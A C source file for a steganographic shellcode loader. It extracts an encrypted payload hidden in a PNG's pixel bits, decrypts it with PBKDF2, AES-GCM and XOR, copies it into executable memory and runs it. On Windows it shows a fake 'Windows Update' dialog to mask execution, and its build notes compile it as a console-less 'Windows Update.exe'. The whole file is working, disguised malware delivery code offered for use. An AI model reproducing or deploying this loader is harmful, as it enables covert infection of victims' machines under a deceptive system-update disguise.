/*
    Author Jieyab89 
    
    # Requirement 
    --------------

    # Mingw-w64 cross-compiler (gcc untuk Windows target)
    sudo apt install -y gcc-mingw-w64-x86-64

    # Build tools (make, binutils, dll.)
    sudo apt install -y build-essential

    # Library math 
    sudo apt install -y libm-dev
    
    # Download stb_image.h:
    wget https://raw.githubusercontent.com/nothings/stb/master/stb_image.h

    # Compile Windows EXE — stealth mode (no console, fake Windows Update UI)
    x86_64-w64-mingw32-gcc -O2 -s -mwindows loader-fake-windows-update -lm -lwininet -lbcrypt  -o Windows Update.exe
*/

#define STB_IMAGE_IMPLEMENTATION
#include "stb_image.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* ── Platform-specific includes ─────────────────────────────────────────── */
#ifdef _WIN32
    #include <windows.h>
    #include <wininet.h>
    #include <bcrypt.h>
    #pragma comment(lib, "wininet.lib")
    #pragma comment(lib, "bcrypt.lib")
    #ifndef BCRYPT_SUCCESS
        #define BCRYPT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
    #endif
#else
    #include <sys/mman.h>
    #include <openssl/evp.h>
    #ifdef USE_CURL
        #include <curl/curl.h>
    #endif
#endif

/* ── Static configuration ───────────────────────────────────────────────── */
#define STATIC_IMAGE    "result.png" // Change this from results stego_encode.py 
#define STATIC_PASSWORD "Password123" // Change this from sett password stego_encode.py 

/* ── Constants ──────────────────────────────────────────────────────────── */
static const uint8_t MAGIC[4] = {0xDE, 0xAD, 0xC0, 0xDE};

#define FIXED_HEADER_LEN  12
#define DEFAULT_BASE_KEY  0xAB
#define KDF_ITERATIONS    200000
#define AES_KEY_LEN       32
#define GCM_TAG_LEN       16

/* ── LSB extraction helper ──────────────────────────────────────────────── */
static void extract_bytes(const uint8_t *channels, size_t bit_pos,
                           uint8_t *out, size_t n_bytes)
{
    for (size_t b = 0; b < n_bytes; b++) {
        uint8_t byte = 0;
        for (int bit = 7; bit >= 0; bit--)
            byte |= (channels[bit_pos++] & 1) << bit;
        out[b] = byte;
    }
}

/* ══════════════════════════════════════════════════════════════════════════
 * Crypto backend — Windows uses BCrypt, Linux uses OpenSSL
 * ══════════════════════════════════════════════════════════════════════════ */

#ifdef _WIN32
/* ── Windows BCrypt: PBKDF2-SHA256 ──────────────────────────────────────── */
static int derive_keys(const char *password, const uint8_t *salt, int salt_len,
                       uint8_t *aes_key, uint8_t *xor_key_out)
{
    uint8_t key_material[AES_KEY_LEN + 1];
    BCRYPT_ALG_HANDLE hAlg = NULL;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL,
                                 BCRYPT_ALG_HANDLE_HMAC_FLAG);
    NTSTATUS st = BCryptDeriveKeyPBKDF2(
        hAlg,
        (PUCHAR)password, (ULONG)strlen(password),
        (PUCHAR)salt,     (ULONG)salt_len,
        KDF_ITERATIONS,
        key_material,     (ULONG)sizeof(key_material),
        0
    );
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(st)) return 0;
    memcpy(aes_key, key_material, AES_KEY_LEN);
    *xor_key_out = key_material[AES_KEY_LEN] ^ DEFAULT_BASE_KEY;
    return 1;
}

/* ── Windows BCrypt: AES-256-GCM decrypt ────────────────────────────────── */
static uint8_t *aes_gcm_decrypt(const uint8_t *aes_key,
                                  const uint8_t *nonce, int nonce_len,
                                  const uint8_t *ciphertext, size_t ct_len,
                                  size_t *out_len)
{
    if (ct_len < GCM_TAG_LEN) return NULL;

    size_t enc_len = ct_len - GCM_TAG_LEN;
    uint8_t *tag = malloc(GCM_TAG_LEN);
    if (!tag) return NULL;
    memcpy(tag, ciphertext + enc_len, GCM_TAG_LEN);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                (PUCHAR)aes_key, AES_KEY_LEN, 0);

    uint8_t *plaintext = malloc(enc_len + 1);
    if (!plaintext) {
        free(tag);
        BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce    = (PUCHAR)nonce;
    authInfo.cbNonce    = (ULONG)nonce_len;
    authInfo.pbTag      = tag;
    authInfo.cbTag      = GCM_TAG_LEN;
    authInfo.pbAuthData = NULL;
    authInfo.cbAuthData = 0;

    ULONG cbResult = 0;
    NTSTATUS st = BCryptDecrypt(
        hKey,
        (PUCHAR)ciphertext, (ULONG)enc_len,
        &authInfo,
        NULL, 0,
        plaintext, (ULONG)enc_len,
        &cbResult, 0
    );

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    free(tag);

    if (!BCRYPT_SUCCESS(st)) { free(plaintext); return NULL; }

    *out_len = cbResult;
    return plaintext;
}

#else  /* Linux — OpenSSL */

static int derive_keys(const char *password, const uint8_t *salt, int salt_len,
                       uint8_t *aes_key, uint8_t *xor_key_out)
{
    uint8_t key_material[AES_KEY_LEN + 1];
    int ok = PKCS5_PBKDF2_HMAC(
        password, (int)strlen(password),
        salt, salt_len,
        KDF_ITERATIONS,
        EVP_sha256(),
        (int)sizeof(key_material),
        key_material
    );
    if (!ok) return 0;
    memcpy(aes_key, key_material, AES_KEY_LEN);
    *xor_key_out = key_material[AES_KEY_LEN] ^ DEFAULT_BASE_KEY;
    return 1;
}

static uint8_t *aes_gcm_decrypt(const uint8_t *aes_key,
                                  const uint8_t *nonce, int nonce_len,
                                  const uint8_t *ciphertext, size_t ct_len,
                                  size_t *out_len)
{
    if (ct_len < GCM_TAG_LEN) return NULL;

    size_t enc_len     = ct_len - GCM_TAG_LEN;
    const uint8_t *tag = ciphertext + enc_len;

    uint8_t *plaintext = malloc(enc_len + 1);
    if (!plaintext) return NULL;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { free(plaintext); return NULL; }

    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, nonce_len, NULL);
    EVP_DecryptInit_ex(ctx, NULL, NULL, aes_key, nonce);

    int len = 0;
    EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, (int)enc_len);
    *out_len = (size_t)len;

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, GCM_TAG_LEN, (void *)tag);

    int final_len = 0;
    int ok = EVP_DecryptFinal_ex(ctx, plaintext + len, &final_len);
    EVP_CIPHER_CTX_free(ctx);

    if (ok <= 0) { free(plaintext); return NULL; }

    *out_len += (size_t)final_len;
    return plaintext;
}

#endif  /* _WIN32 / Linux crypto backend */

/* ── Crypto: Rolling-XOR decrypt ────────────────────────────────────────── */
static void rolling_xor_decrypt(uint8_t *data, size_t len, uint8_t key)
{
    uint8_t k = key;
    for (size_t i = 0; i < len; i++) {
        uint8_t enc = data[i];
        data[i]     = enc ^ k;
        k = (k ^ enc ^ (uint8_t)(i & 0xFF)) & 0xFF;
    }
}

/* ── Core: extract + decrypt shellcode from pixel data ──────────────────── */
static uint8_t *extract_shellcode(const uint8_t *pixels, int width, int height,
                                   const char *password, size_t *sc_len)
{
    size_t total_channels = (size_t)width * height * 3;
    if (total_channels < (size_t)FIXED_HEADER_LEN * 8) return NULL;

    size_t bit_pos = 0;

    uint8_t magic[4];
    extract_bytes(pixels, bit_pos, magic, 4); bit_pos += 32;
    if (memcmp(magic, MAGIC, 4) != 0) return NULL;

    uint8_t tmp2[2];
    extract_bytes(pixels, bit_pos, tmp2, 2); bit_pos += 16;
    uint16_t salt_len = (uint16_t)(tmp2[0] | (tmp2[1] << 8));

    extract_bytes(pixels, bit_pos, tmp2, 2); bit_pos += 16;
    uint16_t nonce_len = (uint16_t)(tmp2[0] | (tmp2[1] << 8));

    uint8_t tmp4[4];
    extract_bytes(pixels, bit_pos, tmp4, 4); bit_pos += 32;
    uint32_t payload_len;
    memcpy(&payload_len, tmp4, 4);

    size_t total_bytes = FIXED_HEADER_LEN + salt_len + nonce_len + payload_len;
    if (payload_len == 0 || total_bytes * 8 > total_channels) return NULL;

    uint8_t *salt = malloc(salt_len);
    if (!salt) return NULL;
    extract_bytes(pixels, bit_pos, salt, salt_len); bit_pos += salt_len * 8;

    uint8_t *nonce = malloc(nonce_len);
    if (!nonce) { free(salt); return NULL; }
    extract_bytes(pixels, bit_pos, nonce, nonce_len); bit_pos += nonce_len * 8;

    uint8_t *ciphertext = malloc(payload_len);
    if (!ciphertext) { free(salt); free(nonce); return NULL; }
    extract_bytes(pixels, bit_pos, ciphertext, payload_len);

    uint8_t aes_key[AES_KEY_LEN];
    uint8_t xor_key;
    if (!derive_keys(password, salt, salt_len, aes_key, &xor_key)) {
        free(salt); free(nonce); free(ciphertext);
        return NULL;
    }
    free(salt);

    size_t plain_len = 0;
    uint8_t *step1 = aes_gcm_decrypt(aes_key, nonce, nonce_len,
                                      ciphertext, payload_len, &plain_len);
    free(nonce); free(ciphertext);
    if (!step1) return NULL;

    rolling_xor_decrypt(step1, plain_len, xor_key);
    *sc_len = plain_len;
    return step1;
}

/* ── Image loading: from file (silent) ──────────────────────────────────── */
static uint8_t *load_from_file(const char *path, int *w, int *h) {
    int channels;
    return stbi_load(path, w, h, &channels, 3);
}

/* ── Execution ──────────────────────────────────────────────────────────── */
#ifdef _WIN32

/* Thread that auto-closes the fake Windows Update dialog after a delay */
static DWORD WINAPI close_dialog_thread(LPVOID param)
{
    DWORD delay_ms = (DWORD)(uintptr_t)param;
    Sleep(delay_ms);
    /* Find and close the dialog by its window title */
    HWND hWnd = FindWindowA(NULL, "Windows Update");
    if (hWnd) PostMessageA(hWnd, WM_CLOSE, 0, 0);
    return 0;
}

static int execute(uint8_t *sc, size_t len)
{
    LPVOID ptr = VirtualAlloc(NULL, len,
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    if (!ptr) return 0;

    RtlMoveMemory(ptr, sc, len);

    /* Start shellcode thread in background */
    HANDLE hShellThread = CreateThread(NULL, 0,
                                        (LPTHREAD_START_ROUTINE)ptr,
                                        NULL, 0, NULL);
    if (!hShellThread) return 0;

    /* Spawn thread that will auto-close the dialog after 2.5 seconds */
    CreateThread(NULL, 0, close_dialog_thread,
                 (LPVOID)(uintptr_t)2500, 0, NULL);

    /* Show fake Windows Update popup — blocks until auto-closed by thread */
    MessageBoxA(NULL,
        "Windows Update\n\n"
        "Updates are being installed in the background.\n\n"
        "Your computer will not be restarted during this process.\n"
        "Please do not turn off your PC.",
        "Windows Update",
        MB_OK | MB_ICONINFORMATION);

    /* Wait for shellcode to finish (process stays alive in background) */
    WaitForSingleObject(hShellThread, INFINITE);
    return 1;
}

#else  /* Linux */

static int execute(uint8_t *sc, size_t len)
{
    void *ptr = mmap(NULL, len,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS,
                     -1, 0);
    if (ptr == MAP_FAILED) return 0;
    memcpy(ptr, sc, len);
    ((void (*)(void))ptr)();
    return 1;
}

#endif  /* _WIN32 / Linux execute */

/* ── Entry point ────────────────────────────────────────────────────────── */
#ifdef _WIN32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    (void)hInstance; (void)hPrevInstance;
    (void)lpCmdLine; (void)nCmdShow;
#else
int main(void) {
#endif
    int width, height;
    uint8_t *pixels = load_from_file(STATIC_IMAGE, &width, &height);
    if (!pixels) return 1;

    size_t sc_len = 0;
    uint8_t *shellcode = extract_shellcode(pixels, width, height,
                                            STATIC_PASSWORD, &sc_len);
    stbi_image_free(pixels);
    if (!shellcode) return 1;

    int ok = execute(shellcode, sc_len);
    free(shellcode);
    return ok ? 0 : 1;
}
